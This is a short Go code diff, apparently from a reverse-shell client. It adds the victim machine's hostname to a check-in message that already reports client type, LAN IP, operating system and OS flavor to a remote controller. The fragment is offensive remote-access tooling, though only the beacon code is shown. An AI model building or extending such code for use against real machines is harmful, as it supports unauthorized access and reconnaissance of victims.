@@ -41,12 +41,14 @@ func GetPort() string {
 		osFlavor = trim(osFlavor[:strings.Index(osFlavor, "\n")])
 		cmd.Run()
 	}
+	hostname := getHostname()
 	it, err := getPort.Write([]byte(
 		"INFO:{clientType:Basic Reverse Shell," +
 			"lanIP:" + GetOutboundIP() + "," +
 			"isEncoded:true" + "," +
 			"os:" + runtime.GOOS + "," +
-			"osFlavor:" + osFlavor +
+			"osFlavor:" + osFlavor + "," +
+			"hostname:" + hostname +
 			"}\n",
 	))
 	if err != nil {
